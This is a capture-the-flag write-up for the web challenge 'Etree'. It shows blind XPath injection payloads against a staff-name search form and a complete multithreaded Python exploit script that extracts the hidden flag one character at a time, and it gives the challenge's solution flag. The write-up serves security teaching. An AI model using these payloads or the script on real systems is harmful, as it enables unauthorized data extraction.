# Web - Etree
This was an XPATH injection challenge that was really fun. 

This challenge had a downloadable XML file that looked like this:
```
<?xml version="1.0" encoding="utf-8"?>

<military>
    <district id="confidential">
    
        <staff>
            <name>abc</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
    </district>

    <district id="confidential">
    
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            <selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>
        </staff>
        
    </district>

    <district id="confidential">
    
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            <selfDestructCode>_f0r_t3st1ng}</selfDestructCode>
        </staff>
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            
        </staff>
    </district>
</military>
```

It is a basic XML file, only interesting information is that the flag is split across several `<selfDestructCode>` elements in the XML.

On the web page, there is a simple form that asks for a staff member name, and responds with a boolean response of whether or not there is a staff member with that name. There is also another page on the site called "Leaderboard" which has some names of staff members on it. Trying these on the form yields a successful response, but random values return a failed response. 

If I try a basic XPATH injection such as `' OR 1=1 OR 'a'='` a successful response is returned. Changing the numbers to be not equal returns a failed response, showing that XPATH injection works. Using `OR 'a'='` is useful because this expands to become `OR 'a'=''` which will always be false, effectively becoming "or false" which will not change the result of the previous segment of the query. 

The `count()` function also works, injecting `' OR count(//selfDestructCode)=2 OR 'a'='` is successful, confirming there are 2 self destruct codes. I found the number 2 by trying 1, then 2. You can keep incrementing this number to bruteforce the result of an integer function. 

I made a python script to automate this guessing. I can also use the `string-length()` function to bruteforce the length of each self destruct code using the same method. I can access the length of the nth self destruct code using `(//selfDestructCode)[n]` where n is an integer. Careful, `//selfDestructCode[n]` means "find a self destruct code that is the nth child in its parent element" which will lead to unexpected results. 

Next, I need to extract each character of the flag. You can get the ith char of the nth self destruct code using `substring((//selfDestructCode)[n],i,1)`. I tried to convert the character to an integer and bruteforce using the above method, but that didn't work, so I just used string literals in the query, such as `'a'`, `'b'`, etc. 

I packaged this up into a python script. I made it multithreaded using asyncio to speed it up and used carriage returns to make the output pretty. Here is my exploit script: 
```py
import asyncio
import sys
import traceback
import string
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import cpu_count

import aiohttp


async def employee_exists(ip, emp):
    # print(f"{emp!r}")
    async with aiohttp.ClientSession() as s:
        async with s.post(
            ip + "/api/search", json={"search": emp}, raise_for_status=True
        ) as r:
            data = await r.json()
            verdict = data.get("success") == 1
            print(f"\r{emp} {verdict}", end="", flush=True)
            # print(f"{emp} {verdict} {data}")
            return verdict


async def brute_int_val(ip, query):
    i = 0
    while True:
        if await employee_exists(ip, f"' or {query}={i} or 'a'='b"):
            return i
        i += 1


def run(corofn, *args):
    loop = asyncio.new_event_loop()
    try:
        coro = corofn(*args)
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    finally:
        loop.close()


async def test_char(ip, query, char_ind, c):
    quote = '"' if c == "'" else "'"
    quoted_char = f"{quote}{c}{quote}"
    r = await employee_exists(
        ip, f"' or substring({query},{char_ind},1)={quoted_char} or 'a'='b"
    )
    # print(f"Char {c} {r}")
    return (
        c,
        r,
    )


async def brute_char(ip, query, char_ind):
    workers = cpu_count()
    # Batch up work so we don't guess after we've already found the solution
    work = list(string.printable[:-5])
    with ThreadPoolExecutor(max_workers=workers) as pool:
        loop = asyncio.get_event_loop()

        while len(work):
            futures = []
            batch = work[:workers]
            work = work[workers:]
            for c in batch:
                futures.append(
                    loop.run_in_executor(pool, run, test_char, ip, query, char_ind, c)
                )

            for coro in asyncio.as_completed(futures):
                c, r = await coro
                if r:
                    return c
    raise ValueError("char not found")


async def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <instanceIp>", file=sys.stderr)
        sys.exit(1)
        return
    ip = sys.argv[1]

    # num_destruct_codes = 2
    print(f"[*] Finding destruct code count...")
    num_destruct_codes = await brute_int_val(ip, "count(//selfDestructCode)")
    print(f"\n[*] There are {num_destruct_codes} destruct codes")

    flag = []
    for code_num in range(1, num_destruct_codes + 1):  # xpath is 1-based
        print(f"[*] Getting string length of code {code_num}")
        q = f"(//selfDestructCode)[{code_num}]"
        l = await brute_int_val(ip, f"string-length({q})")
        print(f"\n[*] Got string length of code {code_num}: {l}")

        for c in range(1, l + 1):
            print(f"[*] Getting char {c} of destruct code {code_num}")
            char = await brute_char(ip, q, c)
            flag.append(char)
            print(
                f"\n[*] Char {c} of destruct code {code_num} is {char!r}, flag: {''.join(flag)!r}"
            )
    print("".join(flag))


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
```

Running the script produces the following flag: `CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}`
